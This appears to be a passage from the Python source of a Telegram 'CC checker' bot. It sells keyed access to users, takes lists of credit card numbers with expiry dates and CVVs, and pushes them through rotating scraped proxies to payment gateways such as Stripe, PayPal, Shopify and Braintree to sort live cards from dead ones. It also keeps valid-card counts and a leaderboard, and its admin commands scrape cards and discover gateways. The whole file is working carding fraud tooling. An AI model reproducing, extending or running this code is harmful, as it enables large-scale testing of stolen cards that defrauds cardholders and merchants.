            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def keys_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                async with db.execute(
                    "SELECT key, created_at, expires_at, max_uses, used_count FROM keys WHERE created_by = ? ORDER BY created_at DESC LIMIT 50",
                    (user_id,)
                ) as cursor:
                    rows = await cursor.fetchall()
                    
                    if not rows:
                        await update.message.reply_text("ℹ️ You haven't generated any keys")
                        return
                    
                    msg = "🔑 *Your Keys*\n\n"
                    for row in rows:
                        key, created, expires, max_uses, used = row
                        status = "✅ Active" if datetime.fromisoformat(expires) > datetime.now() and used < max_uses else "❌ Expired"
                        msg += f"`{key}` - {status}\n"
                        msg += f"  Uses: {used}/{max_uses}\n"
                    
                    await update.message.reply_text(msg, parse_mode='Markdown')
                    
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    # -------------------------------------------------------------------------
    # STATS COMMANDS
    # -------------------------------------------------------------------------
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        stats = await self.db.get_stats(user_id)
    
    # Calculate success rate safely
        if stats['total'] > 0:
            success_rate = (stats['valid'] / stats['total']) * 100
        else:
            success_rate = 0
            
       # Get stats outside the f-string
        user_count = await self._get_user_count()
        total_checks = await self._get_total_checks()
        valid_checks = await self._get_valid_checks()
    
        msg = f"""
📊 *Your Statistics*

✅ Total Checks: {stats['total']}
⭐ Valid CCs: {stats['valid']}
📈 Success Rate: {success_rate:.2f}%

📊 *Overall Bot Stats*
• Active Users: {user_count}
• Total Checks: {total_checks}
• Valid CCs: {valid_checks}
    """
    
        await update.message.reply_text(msg, parse_mode='Markdown')

    async def profile_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        user = await self.db.get_user(user_id)
        
        if not user:
            await update.message.reply_text("❌ User not found")
            return
        
        is_admin = "✅" if user.get('is_admin', 0) else "❌"
        is_banned = "🚫" if user.get('is_banned', 0) else "✅"
        
        msg = f"""
👤 *Profile*

• User ID: `{user_id}`
• Username: @{user.get('username', 'N/A')}
• Joined: {user.get('join_date', 'N/A')}
• Admin: {is_admin}
• Status: {is_banned}

📊 *Stats*
• Checks: {user.get('total_checks', 0)}
• Valid: {user.get('valid_checks', 0)}
• Balance: {user.get('balance', 0)} checks
        """
        
        await update.message.reply_text(msg, parse_mode='Markdown')

    async def leaderboard_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                async with db.execute(
                    "SELECT user_id, username, total_checks, valid_checks FROM users ORDER BY total_checks DESC LIMIT 10"
                ) as cursor:
                    rows = await cursor.fetchall()
                    
                    if not rows:
                        await update.message.reply_text("ℹ️ No users found")
                        return
                    
                    msg = "🏆 *Leaderboard*\n\n"
                    for i, (user_id, username, total, valid) in enumerate(rows, 1):
                        username = username or f"User {user_id}"
                        msg += f"{i}. @{username} - {total} checks ({valid} valid)\n"
                    
                    await update.message.reply_text(msg, parse_mode='Markdown')
                    
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    # -------------------------------------------------------------------------
    # ADMIN COMMANDS
    # -------------------------------------------------------------------------
    
    async def admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        msg = f"""
👑 *ADMIN PANEL*

*Stats:*
• Users: {await self._get_user_count()}
• Total Checks: {await self._get_total_checks()}
• Valid CCs: {await self._get_valid_checks()}
• Active Batches: {len(self.batch_tasks)}
• Proxies: {await self._get_proxy_count()}
• Sites: {await self._get_site_count()}

*Commands:*
/genkey uses days - Generate keys
/ban user_id - Ban user
/unban user_id - Unban user
/setadmin user_id - Make admin
/broadcast message - Broadcast
/scrapeproxy - Scrape proxies
/scrapecc - Scrape CCs
/cleancc - Clean CCs
/sitesearch - Search sites
/addsite domain gateway - Add site
/checkgateway name - Check gateway
/discover url - Discover gateway
/backup - Backup database
        """
        
        await update.message.reply_text(msg, parse_mode='Markdown')

    async def ban_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if not args:
            await update.message.reply_text("❌ *Usage:* `/ban user_id`", parse_mode='Markdown')
            return
        
        target_id = int(args[0])
        
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "UPDATE users SET is_banned = 1 WHERE user_id = ?",
                    (target_id,)
                )
                await db.commit()
            
            await update.message.reply_text(f"✅ User {target_id} has been banned")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def unban_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if not args:
            await update.message.reply_text("❌ *Usage:* `/unban user_id`", parse_mode='Markdown')
            return
        
        target_id = int(args[0])
        
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "UPDATE users SET is_banned = 0 WHERE user_id = ?",
                    (target_id,)
                )
                await db.commit()
            
            await update.message.reply_text(f"✅ User {target_id} has been unbanned")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def set_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        args = context.args
        if not args:
            await update.message.reply_text("❌ *Usage:* `/setadmin user_id`", parse_mode='Markdown')
            return
        
        target_id = int(args[0])
        
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "UPDATE users SET is_admin = 1 WHERE user_id = ?",
                    (target_id,)
                )
                await db.commit()
            
            await update.message.reply_text(f"✅ User {target_id} is now an admin")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        if not context.args:
            await update.message.reply_text("❌ *Usage:* `/broadcast message`", parse_mode='Markdown')
            return
        
        message = ' '.join(context.args)
        
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id FROM users WHERE is_banned = 0") as cursor:
                users = await cursor.fetchall()
        
        sent = 0
        for user in users:
            try:
                await context.bot.send_message(
                    user[0],
                    f"📢 *Broadcast*\n\n{message}",
                    parse_mode='Markdown'
                )
                sent += 1
                await asyncio.sleep(0.05)
            except:
                pass
        
        await update.message.reply_text(f"✅ Broadcast sent to {sent} users")

    async def backup_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user = await self.db.get_user(user_id)
        if not user or not user.get('is_admin', 0):
            await update.message.reply_text("❌ Admin only command")
            return
        
        try:
            # Backup database
            backup_file = f"/tmp/backup_{int(time.time())}.db"
            import shutil
            shutil.copy2(DB_PATH, backup_file)
            
            # Also backup logs
            log_backup = f"/tmp/logs_{int(time.time())}.txt"
            shutil.copy2(LOG_FILE, log_backup)
            
            await update.message.reply_text(
                f"✅ *Backup Complete!*\n\n"
                f"📁 Database: `{backup_file}`\n"
                f"📁 Logs: `{log_backup}`",
                parse_mode='Markdown'
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    # -------------------------------------------------------------------------
    # CALLBACK HANDLERS
    # -------------------------------------------------------------------------
    
    async def gateway_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        gateway = query.data.replace('gateway_', '')
        
        if user_id in self.user_sessions:
            self.user_sessions[user_id]['gateway'] = gateway
        
        action = self.user_sessions.get(user_id, {}).get('action', '')
        
        if action == 'check_cc':
            cc = self.user_sessions[user_id]['cc']
            await self._execute_check(query, user_id, cc, gateway)
        elif action == 'check_file':
            await query.edit_message_text(
                f"✅ Gateway selected: {gateway}\n\n"
                "📁 Now upload your .txt file with CCs"
            )
            self.user_sessions[user_id]['gateway'] = gateway
        else:
            await query.edit_message_text("❌ Invalid session")

    async def check_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()

    async def menu_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        data = query.data.replace('menu_', '')
        
        if data == 'check':
            await query.edit_message_text("Use /check CC|MM|YY|CVV")
        elif data == 'file':
            await query.edit_message_text("Use /checkfile to upload")
        elif data == 'stats':
            await self.stats_command(update, context)
        elif data == 'profile':
            await self.profile_command(update, context)

    # -------------------------------------------------------------------------
    # MESSAGE HANDLERS
    # -------------------------------------------------------------------------
    
    async def file_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if user_id not in self.user_sessions or self.user_sessions[user_id].get('action') != 'check_file':
            await update.message.reply_text("❌ Please use /checkfile first")
            return
        
        document = update.message.document
        if not document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please upload a .txt file")
            return
        
        gateway = self.user_sessions[user_id].get('gateway')
        if not gateway:
            await update.message.reply_text("❌ Gateway not selected. Use /checkfile again")
            return
        
        await update.message.reply_text("📥 Downloading file...")
        
        try:
            file = await context.bot.get_file(document.file_id)
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            
            ccs = [line.strip() for line in text.split('\n') if line.strip()]
            
            if len(ccs) > MAX_BATCH_SIZE:
                await update.message.reply_text(
                    f"⚠️ File has {len(ccs)} CCs. Max is {MAX_BATCH_SIZE}. Truncating..."
                )
                ccs = ccs[:MAX_BATCH_SIZE]
            
            await update.message.reply_text(
                f"✅ Loaded {len(ccs)} CCs\n"
                f"🔍 Checking with gateway: {gateway}\n"
                f"⏳ Starting check..."
            )
            
            task = asyncio.create_task(
                self.checker.check_batch(ccs, gateway, user_id, proxy=True)
            )
            self.batch_tasks[user_id] = task
            
            await self._monitor_batch(update, user_id)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def text_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Handle text input for commands without prefix
        pass

    # -------------------------------------------------------------------------
    # HELPER FUNCTIONS
    # -------------------------------------------------------------------------
    
    def _get_gateway_keyboard(self):
        """Get gateway selection keyboard"""
        keyboard = [
            [
                InlineKeyboardButton("🛍️ Shopify", callback_data="gateway_shopify"),
                InlineKeyboardButton("💳 Razorpay", callback_data="gateway_razorpay"),
            ],
            [
                InlineKeyboardButton("⚡ Stripe", callback_data="gateway_stripe"),
                InlineKeyboardButton("💰 PayPal", callback_data="gateway_paypal"),
            ],
            [
                InlineKeyboardButton("📝 Authorize", callback_data="gateway_authorize"),
                InlineKeyboardButton("🌐 Adyen", callback_data="gateway_adyen"),
            ],
            [
                InlineKeyboardButton("🏦 Braintree", callback_data="gateway_braintree"),
                InlineKeyboardButton("🌍 Worldpay", callback_data="gateway_worldpay"),
            ],
            [
                InlineKeyboardButton("🔄 2Checkout", callback_data="gateway_2checkout"),
            ]
        ]
        return keyboard

    async def _execute_check(self, query, user_id: int, cc: str, gateway: str):
        await query.edit_message_text(
            f"🔍 *Checking CC*\n\nCC: `{cc}`\nGateway: {gateway}\n⏳ Processing...",
            parse_mode='Markdown'
        )
        
        try:
            result = await self.checker.check_batch([cc], gateway, user_id, proxy=True)
            
            if result and result['valid'] > 0:
                valid_cc = result['valid_list'][0]
                msg = f"""
✅ *CC VALID*

CC: `{cc}`
Gateway: {gateway}
Status: {valid_cc['status']}
Response: {valid_cc['response'][:100]}
                """
            elif result and result['invalid'] > 0:
                invalid_cc = result['invalid_list'][0]
                msg = f"""
❌ *CC INVALID*

CC: `{cc}`
Gateway: {gateway}
Status: {invalid_cc['status']}
Response: {invalid_cc['response'][:100]}
                """
            else:
                msg = f"""
❓ *CC UNKNOWN*

CC: `{cc}`
Gateway: {gateway}
Could not determine status
                """
            
            await query.edit_message_text(msg, parse_mode='Markdown')
            
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {str(e)}")

    async def _monitor_batch(self, update: Update, user_id: int):
        if user_id not in self.batch_tasks:
            return
        
        task = self.batch_tasks[user_id]
        start_time = time.time()
        
        while not task.done():
            elapsed = time.time() - start_time
            if elapsed > 30:
                await update.message.reply_text("⏳ Batch is taking longer than expected...")
                break
            await asyncio.sleep(2)
        
        if task.done():
            try:
                result = task.result()
                if result:
                    msg = f"""
✅ *BATCH COMPLETE!*

📊 *Results:*
• Total: {result['total']}
• Checked: {result['checked']}
• ✅ Valid: {result['valid']}
• ❌ Invalid: {result['invalid']}
• ❓ Unknown: {result['unknown']}

⏱️ Time: {time.time() - start_time:.2f}s
                    """
                    await update.message.reply_text(msg, parse_mode='Markdown')
                else:
                    await update.message.reply_text("❌ Batch returned no results")
            except Exception as e:
                await update.message.reply_text(f"❌ Batch failed: {str(e)}")
            finally:
                if user_id in self.batch_tasks:
                    del self.batch_tasks[user_id]

    async def _has_valid_key(self, user_id: int) -> bool:
        user = await self.db.get_user(user_id)
        if user and user.get('is_admin', 0):
            return True
        
        if user and user.get('balance', 0) > 0:
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "UPDATE users SET balance = balance - 1 WHERE user_id = ? AND balance > 0",
                    (user_id,)
                )
                await db.commit()
                if db.total_changes > 0:
                    return True
        
        return False

    async def _get_user_count(self) -> int:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT COUNT(*) FROM users") as cursor:
                row = await cursor.fetchone()
                return row[0] if row else 0

    async def _get_total_checks(self) -> int:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT SUM(total_checks) FROM users") as cursor:
                row = await cursor.fetchone()
                return row[0] if row and row[0] else 0

    async def _get_valid_checks(self) -> int:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT SUM(valid_checks) FROM users") as cursor:
                row = await cursor.fetchone()
                return row[0] if row and row[0] else 0

    async def _get_proxy_count(self) -> int:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT COUNT(*) FROM proxies WHERE is_alive = 1") as cursor:
                row = await cursor.fetchone()
                return row[0] if row else 0

    async def _get_site_count(self) -> int:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT COUNT(*) FROM sites WHERE is_active = 1") as cursor:
                row = await cursor.fetchone()
                return row[0] if row else 0

    # -------------------------------------------------------------------------
    # RUN BOT
    # -------------------------------------------------------------------------
    
    async def run(self):
        logger.info("🚀 Starting UNCAI CC Checker Bot with all features...")
        self.db = Database()
        
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()
        
        logger.info("✅ Bot is running with:")
        logger.info("   • CC Scraper")
        logger.info("   • Site Scraper")
        logger.info("   • Gateway Checker")
        logger.info("   • Proxy Scraper")
        logger.info("   • 12+ Gateways")
        
        while True:
            await asyncio.sleep(1)

# -----------------------------------------------------------------------------
# CC CHECKER ENGINE (Complete)
# -----------------------------------------------------------------------------
class CCChecker:
    def __init__(self):
        self.db = Database()
        self.proxy_scraper = ProxyScraper()
        self.results_queue = asyncio.Queue()
        self.is_running = False
        self.batch_results: Dict[str, List] = {}

    async def check_batch(self, ccs: List[str], gateway: str, user_id: int, proxy: bool = True) -> Dict:
        if len(ccs) > MAX_BATCH_SIZE:
            ccs = ccs[:MAX_BATCH_SIZE]
        
        self.is_running = True
        batch_id = hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()
        self.batch_results[batch_id] = []
        
        proxies = []
        if proxy:
            proxies = await self.proxy_scraper.get_alive_proxies(limit=min(len(ccs), 100))
        
        executor = ThreadPoolExecutor(max_workers=THREAD_POOL_SIZE)
        
        tasks = []
        for i, cc in enumerate(ccs):
            proxy = proxies[i % len(proxies)] if proxies else None
            task = asyncio.get_event_loop().run_in_executor(
                executor,
                self._check_single_sync,
                cc,
                gateway,
                proxy
            )
            tasks.append(task)
        
        results = []
        for future in asyncio.as_completed(tasks, timeout=30):
            try:
                result = await future
                if result:
                    results.append(result)
                    await self.db.add_result(
                        user_id,
                        result['cc'],
                        gateway,
                        result['status'],
                        result['response'],
                        result.get('proxy', '')
                    )
                    if result['status'] == 'valid':
                        await self.db.update_user_stats(user_id, total_checks=1, valid_checks=1)
                    else:
                        await self.db.update_user_stats(user_id, total_checks=1)
            except Exception as e:
                logger.error(f"Task error: {e}")
        
        executor.shutdown(wait=False)
        self.is_running = False
        
        valid = [r for r in results if r['status'] == 'valid']
        invalid = [r for r in results if r['status'] == 'invalid']
        unknown = [r for r in results if r['status'] == 'unknown']
        
        return {
            "batch_id": batch_id,
            "total": len(ccs),
            "checked": len(results),
            "valid": len(valid),
            "invalid": len(invalid),
            "unknown": len(unknown),
            "valid_list": valid,
            "invalid_list": invalid,
            "unknown_list": unknown
        }

    def _check_single_sync(self, cc_str: str, gateway: str, proxy: Dict = None) -> Optional[Dict]:
        try:
            parts = cc_str.split('|')
            if len(parts) < 4:
                return None
            
            number = parts[0].strip()
            month = parts[1].strip()
            year = parts[2].strip()
            cvv = parts[3].strip()
            
            if not self._validate_luhn(number):
                return {"cc": cc_str, "status": "invalid", "response": "Luhn failed"}
            
            gateway_config = GATEWAYS.get(gateway)
            if not gateway_config:
                return {"cc": cc_str, "status": "invalid", "response": "Gateway not found"}
            
            url = gateway_config['url']
            method = gateway_config['method']
            headers = gateway_config['headers'].copy()
            
            data = self._prepare_gateway_data(gateway, number, month, year, cvv)
            
            proxy_str = None
            if proxy:
                proxy_str = f"{proxy['protocol']}://{proxy['ip']}:{proxy['port']}"
            
            response = None
            try:
                if method == "POST":
                    if gateway == "stripe":
                        response = requests.post(url, data=data, headers=headers, proxies={'http': proxy_str, 'https': proxy_str}, timeout=REQUEST_TIMEOUT)
                    else:
                        response = requests.post(url, json=data, headers=headers, proxies={'http': proxy_str, 'https': proxy_str}, timeout=REQUEST_TIMEOUT)
                else:
                    response = requests.get(url, headers=headers, proxies={'http': proxy_str, 'https': proxy_str}, timeout=REQUEST_TIMEOUT)
                
                status = self._analyze_response(response, gateway)
                
                return {
                    "cc": cc_str,
                    "status": status,
                    "response": response.text[:500] if response else "",
                    "proxy": proxy_str if proxy else "",
                    "status_code": response.status_code if response else 0
                }
                
            except requests.exceptions.Timeout:
                return {"cc": cc_str, "status": "unknown", "response": "Timeout"}
            except requests.exceptions.ConnectionError:
                return {"cc": cc_str, "status": "unknown", "response": "Connection error"}
            except Exception as e:
                return {"cc": cc_str, "status": "unknown", "response": str(e)}
                
        except Exception as e:
            logger.error(f"Check error: {e}")
            return None

    def _validate_luhn(self, number: str) -> bool:
        number = re.sub(r'[^0-9]', '', number)
        if not number:
            return False
        
        if len(number) < 15 or len(number) > 16:
            return False
        
        total = 0
        reverse_digits = number[::-1]
        for i, digit in enumerate(reverse_digits):
            n = int(digit)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        
        return total % 10 == 0

    def _prepare_gateway_data(self, gateway: str, number: str, month: str, year: str, cvv: str) -> Dict:
        if gateway == "shopify":
            return {
                "card[number]": number,
                "card[expiry]": f"{month}/{year}",
                "card[cvv]": cvv,
                "card[zip]": "12345"
            }
        elif gateway == "razorpay":
            return {
                "card[number]": number,
                "card[expiry_month]": month,
                "card[expiry_year]": year,
                "card[cvv]": cvv,
                "card[name]": "Test User"
            }
        elif gateway == "stripe":
            return {
                "card[number]": number,
                "card[exp_month]": month,
                "card[exp_year]": year,
                "card[cvc]": cvv
            }
        elif gateway == "paypal":
            return {
                "credit_card[number]": number,
                "credit_card[expire_month]": month,
                "credit_card[expire_year]": year,
                "credit_card[cvv2]": cvv
            }
        elif gateway == "authorize":
            return {
                "cardNumber": number,
                "expirationDate": f"{month}{year}",
                "cardCode": cvv
            }
        elif gateway == "adyen":
            return {
                "card.number": number,
                "card.expiryMonth": month,
                "card.expiryYear": year,
                "card.cvc": cvv
            }
        elif gateway == "braintree":
            return {
                "credit_card[number]": number,
                "credit_card[expiration_date]": f"{month}/{year}",
                "credit_card[cvv]": cvv
            }
        elif gateway == "worldpay":
            return {
                "card.number": number,
                "card.expiry_month": month,
                "card.expiry_year": year,
                "card.cvc": cvv
            }
        elif gateway == "2checkout":
            return {
                "cardNumber": number,
                "cardExpiration": f"{month}{year}",
                "cardCvv": cvv
            }
        return {}

    def _analyze_response(self, response: requests.Response, gateway: str) -> str:
        if not response:
            return "unknown"
        
        status_code = response.status_code
        text = response.text.lower()
        
        success_indicators = GATEWAYS.get(gateway, {}).get("success_indicators", [
            "success", "approved", "authorized", "charged", "payment successful",
            "complete", "valid", "ok", "thank you", "order placed"
        ])
        
        failure_indicators = [
            "declined", "invalid", "error", "failed", "insufficient", "expired",
            "cvv", "security", "fraud", "blocked", "suspected"
        ]
        
        if status_code in [200, 201, 202]:
            for indicator in success_indicators:
                if indicator in text:
                    return "valid"
            
            # Specific gateway checks
            if gateway == "stripe" and "token" in text:
                return "valid"
            if gateway == "paypal" and "payment" in text:
                return "valid"
            if gateway == "razorpay" and "payment_id" in text:
                return "valid"
            if gateway == "shopify" and "cart" in text:
                return "valid"
            if gateway == "authorize" and "approved" in text:
                return "valid"
            if gateway == "adyen" and "pspReference" in text:
                return "valid"
            if gateway == "braintree" and "transaction" in text:
                return "valid"
            if gateway == "worldpay" and "orderCode" in text:
                return "valid"
            if gateway == "2checkout" and "Order" in text:
                return "valid"
        
        if status_code in [400, 401, 402, 403, 404, 406, 409, 422, 429]:
            for indicator in failure_indicators:
                if indicator in text:
                    return "invalid"
        
        if status_code in [408, 504]:
            return "unknown"
        
        return "unknown"

# -----------------------------------------------------------------------------
# MAIN ENTRY POINT
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    import hashlib
    bot = CCBot(BOT_TOKEN)
    asyncio.run(bot.run())
